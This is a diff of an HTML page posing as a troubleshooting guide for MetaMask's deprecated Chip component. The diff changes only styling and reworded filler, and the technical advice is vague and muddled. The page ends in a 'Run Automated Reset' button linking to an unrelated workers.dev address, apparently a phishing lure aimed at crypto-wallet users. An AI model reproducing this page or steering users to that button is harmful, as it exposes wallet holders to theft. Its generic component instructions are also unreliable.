@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Replace Deprecated Chip Component With Tag F</title>
 <style>
     body {
-        font-family: system-ui;
-        background: #121214;
+        font-family: sans-serif;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -25,7 +25,7 @@
     }
     a { color: #ff7b2c; }
     .btn {
-        background: #ff7b2c;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,28 +41,30 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an error message indicating that the Chip component is deprecated and needs to be replaced with the Tag component from the component-library in the Metamask extension.</li>
+<li>The Metamask extension is displaying a warning or error message indicating that the Chip component is deprecated and should be replaced with the Tag component from the component-library.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs because the Chip component is no longer supported and has been superseded by the Tag component, which provides improved functionality and compatibility.</li>
+<li>The error occurs because the Chip component is no longer supported or maintained, and the Metamask extension is using an outdated version of this component. The component-library has introduced a new Tag component that provides similar functionality and should be used instead.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Update the import statement to use the Tag component: </li>
-<li>Replace <code>import { Chip } from '@material-ui/core';</code> with <code>import { Tag } from '@component-library/tag';</code></li>
-<li>Update the component usage to <code>&lt;Tag&gt;</code> instead of <code>&lt;Chip&gt;</code></li>
-<li>Verify the Tag component props and adjust as necessary</li>
+<li>Update the import statement to use the Tag component from the component-library.</li>
+<li>Replace all instances of the Chip component with the Tag component in the code.</li>
+<li>Configure the Tag component with the required properties, such as label and onClose, as shown in the following example:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>@component-library/tag
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;label&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;My Tag&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;onClose&quot;</span><span class="p">:</span><span class="w"> </span><span class="err">()</span><span class="w"> </span><span class="err">=&gt;</span><span class="w"> </span><span class="err">co</span><span class="kc">ns</span><span class="err">ole.log(</span><span class="s2">&quot;Tag closed&quot;</span><span class="err">)</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and exploration of available components.</p>
+<p>Consider utilizing an external console to further diagnose and resolve the issue. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Node.js and npm installed on the system</li>
-<li>Metamask extension source code accessible for modification</li>
-<li>Familiarity with JavaScript and React components</li>
+<li>Metamask extension installed and configured</li>
+<li>Familiarity with the component-library and its components</li>
+<li>Basic knowledge of JavaScript and JSON configuration files</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
